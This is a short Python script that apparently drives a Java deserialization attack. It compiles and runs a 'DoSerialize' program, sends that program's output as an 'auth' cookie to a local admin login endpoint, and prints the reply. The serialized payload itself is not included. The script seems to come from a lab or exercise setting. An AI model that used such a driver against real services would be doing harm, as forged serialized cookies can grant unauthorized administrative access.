import requests
import subprocess
import shlex

def console(cmd):
    """Execute a command securely and return the output"""
    try:
        # Use list form of arguments which prevents shell injection
        args = shlex.split(cmd)
        # Don't use shell=True to avoid command injection vulnerabilities
        p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = p.communicate()
        return (p.returncode, out, err)
    except Exception as e:
        return (1, b"", str(e).encode())

# Using fixed commands with proper argument handling
console("javac DoSerialize.java")
cookieval = console("java DoSerialize")
cookie = {'auth': cookieval[1].strip()}
r = requests.post('http://localhost:8081/admin/login', cookies=cookie, data=" ", allow_redirects=True)
print(r.text)  # Added parentheses for Python 3 compatibility

